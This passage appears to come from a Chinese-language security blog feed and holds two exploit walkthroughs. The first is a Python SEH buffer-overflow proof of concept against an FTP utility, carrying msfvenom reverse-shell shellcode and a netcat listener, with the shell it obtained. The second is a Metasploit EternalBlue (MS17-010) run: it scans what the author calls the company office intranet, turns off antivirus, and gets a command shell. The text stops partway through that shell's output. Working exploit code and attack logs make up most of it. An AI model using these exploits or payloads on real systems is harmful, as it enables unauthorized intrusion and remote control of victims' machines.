&quot;\x22\x10\xb6\xa2\x01\xed\xe9\x84\x53\xbe\xc5\x7c\x22&quot;</span><br><span class="line">buf +&#x3D; &quot;\x1c\x34\x5f\x7f\x39\x44\x4a\x88\x59\x57\x56\xc6\xc4&quot;</span><br><span class="line">buf +&#x3D; &quot;\x9f\xa7\x8f\x6c\xbf\xd1\xa9\x44\x1a\x39\x5f\x4d\x1c&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe7\x01\x2b\x58\x60\x1c\x72\xf1\xba\xa1\xba\x40\x35&quot;</span><br><span class="line">buf +&#x3D; &quot;\x7e\x13\x4a\x8a\xf4\x40\x48\x51\x59\x75\x99\x4b\xa0&quot;</span><br><span class="line">buf +&#x3D; &quot;\x29\x04\x1d\xed\x3e\x69\xbc\x19\xa7\xff\xc8\x30\x8a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x73\x03\x08\xbc\xd8\xf3\xf7\xd0\xd8\x63\xfb\x9e\x4a&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe7\x94\x89\x64\x70\x9b\xb5\xbf\x99\xdb\xeb\x37\x12&quot;</span><br><span class="line">buf +&#x3D; &quot;\x2d\x01\x94\x9b\xb9\xbc\x2e\xd9\xc5\x06\x63\x8f\xca&quot;</span><br><span class="line">buf +&#x3D; &quot;\x8a\x30\x2e\x14\x83\xf8\xb2\x10\x6c\x40\x0e\xbb\x82&quot;</span><br><span class="line">buf +&#x3D; &quot;\x91\xff\x27\xdf\x8a\x0b\x58\x56\xe9\xb1\x70\xc6\xb6&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc6\x4d\x2b\x4f\x5b\x22\xab\xb9\xdf\xa9\xc3\x06\xc0&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc0\xe2\x94\xc4\xfb\xff\x05\x53\xa3\xac\x16\xc3\x98&quot;</span><br><span class="line">buf +&#x3D; &quot;\xbb\x8c\x6f\x30\xfc\x9d\x3e\x4f\x8b\x85\x31\x41\x4a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x53\x26\x74\x01\x80\x9f\x30\x8e\x3f\x7d\xeb\x71\x8c&quot;</span><br><span class="line">buf +&#x3D; &quot;\x02\x54\xe7\x9e\x15\x04\xea\x78\xaa\xe8\xde\x8d\x56&quot;</span><br><span class="line">buf +&#x3D; &quot;\x80\x3c\x15\xe1\xf1\xda\x5f\x93\xa4\x6a\xdb\x97\x1f&quot;</span><br><span class="line">buf +&#x3D; &quot;\xd5\xba\xf0\x5b\xa3\x75\x70\x33\x25\x05\xec\xb7\x47&quot;</span><br><span class="line">buf +&#x3D; &quot;\x6f\x4a&quot;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;设置监听</span><br><span class="line">nc -nlvp 3389</span><br></pre></td></tr></table></figure><p>然后修改POC，把shellcode替换进去。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">#buffer &#x3D; &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2B&quot;</span><br><span class="line">#msfvenom -a x86 --platform windows -p windows&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.0.118 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -b &quot;\x00\x0d\x0a\x3d\x5c\x2f&quot; -i 3 -f python</span><br><span class="line">buf &#x3D;  &quot;&quot;</span><br><span class="line">buf +&#x3D; &quot;\xba\x0b\x39\x72\xbe\xd9\xce\xd9\x74\x24\xf4\x5e\x29&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc9\xb1\x5f\x31\x56\x14\x83\xc6\x04\x03\x56\x10\xe9&quot;</span><br><span class="line">buf +&#x3D; &quot;\xcc\xab\x72\x56\x47\xff\xfa\xc7\x41\x8b\xd8\xe3\x2a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x5d\xe8\xba\x93\x1e\x2a\xb8\x12\x79\xbd\xc3\x0c\x6f&quot;</span><br><span class="line">buf +&#x3D; &quot;\x23\x5f\xc4\x23\x15\x75\xbe\x87\xac\xb5\xcf\x40\x1a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x5e\x8c\x5f\x67\x29\x86\xda\x70\x47\xbe\x62\x94\xf2&quot;</span><br><span class="line">buf +&#x3D; &quot;\x88\x05\x39\xec\x86\xe5\xb0\x73\x5f\x23\x87\x74\x2d&quot;</span><br><span class="line">buf +&#x3D; &quot;\x94\xe3\xb4\x2b\xfd\xd4\x8f\x82\xc9\x32\x7b\x60\x87&quot;</span><br><span class="line">buf +&#x3D; &quot;\x7a\xcd\x97\xa8\x9d\x04\x0f\xb7\xd6\x95\xf6\x3b\x23&quot;</span><br><span class="line">buf +&#x3D; &quot;\x66\x7a\x6a\xa6\x5a\x8f\xb4\x84\xc9\x45\x24\xd7\x59&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe2\x20\xe8\x3f\x89\xbb\x74\x28\x33\x6b\xef\xed\xb4&quot;</span><br><span class="line">buf +&#x3D; &quot;\xdf\xd4\xcd\xee\x4f\xa3\x08\xce\xc2\xc2\x87\x7c\x36&quot;</span><br><span class="line">buf +&#x3D; &quot;\x03\x96\x9d\xb9\x8c\x38\x5d\x9f\xbb\x34\xda\xae\x07&quot;</span><br><span class="line">buf +&#x3D; &quot;\x22\x10\xb6\xa2\x01\xed\xe9\x84\x53\xbe\xc5\x7c\x22&quot;</span><br><span class="line">buf +&#x3D; &quot;\x1c\x34\x5f\x7f\x39\x44\x4a\x88\x59\x57\x56\xc6\xc4&quot;</span><br><span class="line">buf +&#x3D; &quot;\x9f\xa7\x8f\x6c\xbf\xd1\xa9\x44\x1a\x39\x5f\x4d\x1c&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe7\x01\x2b\x58\x60\x1c\x72\xf1\xba\xa1\xba\x40\x35&quot;</span><br><span class="line">buf +&#x3D; &quot;\x7e\x13\x4a\x8a\xf4\x40\x48\x51\x59\x75\x99\x4b\xa0&quot;</span><br><span class="line">buf +&#x3D; &quot;\x29\x04\x1d\xed\x3e\x69\xbc\x19\xa7\xff\xc8\x30\x8a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x73\x03\x08\xbc\xd8\xf3\xf7\xd0\xd8\x63\xfb\x9e\x4a&quot;</span><br><span class="line">buf +&#x3D; &quot;\xe7\x94\x89\x64\x70\x9b\xb5\xbf\x99\xdb\xeb\x37\x12&quot;</span><br><span class="line">buf +&#x3D; &quot;\x2d\x01\x94\x9b\xb9\xbc\x2e\xd9\xc5\x06\x63\x8f\xca&quot;</span><br><span class="line">buf +&#x3D; &quot;\x8a\x30\x2e\x14\x83\xf8\xb2\x10\x6c\x40\x0e\xbb\x82&quot;</span><br><span class="line">buf +&#x3D; &quot;\x91\xff\x27\xdf\x8a\x0b\x58\x56\xe9\xb1\x70\xc6\xb6&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc6\x4d\x2b\x4f\x5b\x22\xab\xb9\xdf\xa9\xc3\x06\xc0&quot;</span><br><span class="line">buf +&#x3D; &quot;\xc0\xe2\x94\xc4\xfb\xff\x05\x53\xa3\xac\x16\xc3\x98&quot;</span><br><span class="line">buf +&#x3D; &quot;\xbb\x8c\x6f\x30\xfc\x9d\x3e\x4f\x8b\x85\x31\x41\x4a&quot;</span><br><span class="line">buf +&#x3D; &quot;\x53\x26\x74\x01\x80\x9f\x30\x8e\x3f\x7d\xeb\x71\x8c&quot;</span><br><span class="line">buf +&#x3D; &quot;\x02\x54\xe7\x9e\x15\x04\xea\x78\xaa\xe8\xde\x8d\x56&quot;</span><br><span class="line">buf +&#x3D; &quot;\x80\x3c\x15\xe1\xf1\xda\x5f\x93\xa4\x6a\xdb\x97\x1f&quot;</span><br><span class="line">buf +&#x3D; &quot;\xd5\xba\xf0\x5b\xa3\x75\x70\x33\x25\x05\xec\xb7\x47&quot;</span><br><span class="line">buf +&#x3D; &quot;\x6f\x4a&quot;   &#x2F;&#x2F;这里替换成刚刚生成的shellcode</span><br><span class="line">#nSEH &#x3D; &quot;\xEB\x13\x90\x90&quot;</span><br><span class="line">#SEH &#x3D; &quot;\x9D\x6D\x20\x12&quot; &gt;&gt; 12206D9D</span><br><span class="line">buffer &#x3D; &quot;\x41&quot; * 1037 + &quot;\xeb\x0a\x90\x90&quot; + &quot;\x9D\x6D\x20\x12&quot; + &quot;\x90&quot; *30 +  buf +  &quot;D&quot;*1955</span><br><span class="line">#buffer &#x3D; &quot;\x41&quot; * 1060</span><br><span class="line">print &quot;\sending evil buffer....&quot;</span><br><span class="line">s.connect((&#39;192.168.1.88&#39;,21)) #这里替换成目标主机IP</span><br><span class="line">data &#x3D; s.recv(1024)</span><br><span class="line">s.send(&#39;USER anonymous&#39; + &#39;\r\n&#39;)</span><br><span class="line">data &#x3D; s.recv(1024)</span><br><span class="line">s.send(&#39;PASS anonymous&#39; + &#39;\r\n&#39;)</span><br><span class="line">data &#x3D; s.recv(1024)</span><br><span class="line">s.send(&#39;CWD &#39; +buffer+&#39;\r\n&#39;)</span><br><span class="line">s.close</span><br></pre></td></tr></table></figure><p>最后执行POC,成功反弹回shell,剩下的后渗透我就不演示了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">python 39215.py</span><br><span class="line"></span><br><span class="line">root@vimc:~# nc -nlvp 3389</span><br><span class="line">Listening on [unknown] (family 0, port 1228903624)</span><br><span class="line">Connection from 192.168.1.88 63535 received!</span><br><span class="line">Microsoft Windows [�汾 6.1.7600]</span><br><span class="line">��Ȩ���� (c) 2009 Microsoft Corporation����������Ȩ����</span><br><span class="line"></span><br><span class="line">C:\Program Files (x86)\KONICA MINOLTA\FTP Utility&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Windows系统SMB服务MS17-010漏洞复现</title>
      <link href="MS17-010/"/>
      <url>MS17-010/</url>
      
        <content type="html"><![CDATA[<h3 id="1-前面先说"><a href="#1-前面先说" class="headerlink" title="1#前面先说"></a>1#前面先说</h3><p>说到MS17-010大家肯定会想起17年的Wannacry勒索病毒，该病毒利用17年4月份方程式黑客组织放出的0Day大肆传播。其实当时刚放出来的时候我就复现过了，用的当时方程式放出的工具包，因为他那个工具包利用起来比较麻烦，所以一直懒得写出来，今天看到MSF上有现成的<code>Exploit</code>顺便就写下来吧。</p><h3 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2.漏洞复现"></a>2.漏洞复现</h3><p>先扫描内网主机，网上的扫描器也很多，这里有现成的模块我就用这个扫描了，这里扫描的内网还是公司的办公内网。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">search ms17-010</span><br><span class="line"></span><br><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010    &#x2F;&#x2F;选择扫描模块</span><br><span class="line"></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting                                                 Required  Description</span><br><span class="line">   ----         ---------------                                                 --------  -----------</span><br><span class="line">   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts</span><br><span class="line">   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts</span><br><span class="line">   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts</span><br><span class="line">   NAMED_PIPES  &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;wordlists&#x2F;named_pipes.txt  yes       List of named pipes to check</span><br><span class="line">   RHOSTS                                                                       yes       The target address range or CIDR identifier</span><br><span class="line">   RPORT        445                                                             yes       The SMB service port (TCP)</span><br><span class="line">   SMBDomain    .                                                               no        The Windows domain to use for authentication</span><br><span class="line">   SMBPass                                                                      no        The password for the specified username</span><br><span class="line">   SMBUser                                                                      no        The username to authenticate as</span><br><span class="line">   THREADS      1                                                               yes       The number of concurrent threads</span><br><span class="line"></span><br><span class="line">msf auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set RHOSTS 192.168.1.1&#x2F;24</span><br><span class="line">RHOSTS &#x3D;&gt; 192.168.1.1&#x2F;24</span><br><span class="line">msf auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set threads 16</span><br><span class="line">threads &#x3D;&gt; 16</span><br><span class="line">msf auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</span><br><span class="line"></span><br><span class="line">[+] 192.168.1.12:445      - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)</span><br><span class="line">[-] 192.168.1.26:445      - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned  32 of 256 hosts (12% complete)</span><br><span class="line">[+] 192.168.1.35:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[-] 192.168.1.51:445      - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned  53 of 256 hosts (20% complete)</span><br><span class="line">[-] 192.168.1.83:445      - Host does NOT appear vulnerable.</span><br><span class="line">[+] 192.168.1.71:445      - Host is likely VULNERABLE to MS17-010! - Windows 5.1</span><br><span class="line">[*] Scanned  87 of 256 hosts (33% complete)</span><br><span class="line">[-] 192.168.1.100:445     - Host does NOT appear vulnerable.</span><br><span class="line">[+] 192.168.1.88:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600 x64 (64-bit)</span><br><span class="line">[-] 192.168.1.104:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.1.107:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.1.106:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 103 of 256 hosts (40% complete)</span><br><span class="line">[-] 192.168.1.103:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.1.118:445     - Host does NOT appear vulnerable.</span><br><span class="line">[-] 192.168.1.137:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 133 of 256 hosts (51% complete)</span><br><span class="line">[*] Scanned 154 of 256 hosts (60% complete)</span><br><span class="line">[*] Scanned 181 of 256 hosts (70% complete)</span><br><span class="line">[-] 192.168.1.199:445     - An SMB Login Error occurred while connecting to the IPC$ tree.</span><br><span class="line">[*] Scanned 205 of 256 hosts (80% complete)</span><br><span class="line">[*] Scanned 231 of 256 hosts (90% complete)</span><br><span class="line">[-] 192.168.1.253:445     - Host does NOT appear vulnerable.</span><br><span class="line">[*] Scanned 256 of 256 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">&#x2F;&#x2F;这里看出有4台主机存在MS17-010漏洞,back退出模块</span><br><span class="line">msf auxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; back</span><br></pre></td></tr></table></figure><p>这里复现用的是<code>exploit/windows/smb/ms17_010_eternalblue</code>这个exploit,还有一个是针对Win8以上的Exploit即<code>exploit/windows/smb/ms17_010_eternalblue_win8</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOST                           yes       The target address</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set RHOST 192.168.1.88    &#x2F;&#x2F;这里其他都是配置好的所以我只用设置目标IP</span><br><span class="line">RHOST &#x3D;&gt; 192.168.1.88</span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit</span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.129:4444</span><br><span class="line">[*] 192.168.1.88:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.1.88:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.1.88:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.88:445 - CORE raw buffer dump (27 bytes)</span><br><span class="line">[*] 192.168.1.88:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 192.168.1.88:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     </span><br><span class="line">[+] 192.168.1.88:445 - Target arch selected valid for arch indicated by DCE&#x2F;RPC reply</span><br><span class="line">[*] 192.168.1.88:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.88:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[-] 192.168.1.88:445 - Errno::ECONNRESET: Connection reset by peer</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;这里利用失败龙，可能是被360防御了，于是我把360退出后再试一次</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.1.129:4444</span><br><span class="line">[*] 192.168.1.88:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 192.168.1.88:445 - Connection established for exploitation.</span><br><span class="line">[+] 192.168.1.88:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 192.168.1.88:445 - CORE raw buffer dump (27 bytes)</span><br><span class="line">[*] 192.168.1.88:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 192.168.1.88:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     </span><br><span class="line">[+] 192.168.1.88:445 - Target arch selected valid for arch indicated by DCE&#x2F;RPC reply</span><br><span class="line">[*] 192.168.1.88:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 192.168.1.88:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 192.168.1.88:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 192.168.1.88:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 192.168.1.88:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 192.168.1.88:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 192.168.1.88:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 192.168.1.88:445 - Receiving response from exploit packet</span><br><span class="line">[+] 192.168.1.88:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 192.168.1.88:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 192.168.1.88:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Command shell session 1 opened (192.168.1.129:4444 -&gt; 192.168.1.88:49416) at 2018-11-23 15:22:04 +0800</span><br><span class="line">[+] 192.168.1.88:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 192.168.1.88:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-WIN-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line">[+] 192.168.1.88:445 - &#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;-&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;ls</span><br><span class="line">ls</span><br><span class="line">&#39;ls&#39; �����ڲ����ⲿ���Ҳ���ǿ����еĳ���</span><br><span class="line">���������ļ���</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP ����</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">��̫�������� �������� 2:</span><br><span class="line"></span><br><span class="line">   �����ض��� DNS ��׺ . . . . . . . :</span><br><span class="line">   �������� IPv6 ��ַ. . . . . . . . : fe80::ddb3:ae04:337d:cc4%14</span><br><span class="line">   IPv4 ��ַ . . . . . . . . . . . . : 192.168.1.88</span><br><span class="line">   ��������  . . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Ĭ������. . . . . . . . . . . . . : 192.168.1.1</span><br><span class="line"></span><br><span class="line">���������� isatap.&#123;0B2E402E-9CF8-4812-A9B5-4E208CF2A48D&#125;:</span><br><span class="line"></span><br><span 